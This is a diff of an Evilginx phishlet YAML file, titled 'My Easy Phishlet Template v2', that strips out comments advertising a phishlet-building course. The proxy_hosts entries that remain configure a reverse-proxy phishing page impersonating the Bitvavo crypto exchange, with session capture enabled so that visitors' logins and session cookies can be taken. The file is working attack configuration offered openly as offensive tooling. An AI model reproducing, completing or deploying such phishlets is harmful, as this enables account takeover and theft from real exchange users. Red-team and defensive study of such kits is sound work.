@@ -2,13 +2,7 @@ author: 'SimplerHacking'
 min_ver: '3.3.0'
 name: 'My Easy Phishlet Template v2'
 
-# Creating phishlets can be complex, therefore I created the open template to save time and reduce errors in the process
-
-# Learn my process for creating Evilginx Phishlets by signing up for my Phishlet Developer Training Program
-
-# The course will explain my systematic process for coding Evilginx Phishlets from scratch in YAML and what I have learned over the years working with offensive security specialists, hackers & red teams
-
-proxy_hosts: # Count number of Subdomains Using Application + Network Tab = 
+proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'bitvavo.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'bitvavo.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'www2', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: true}
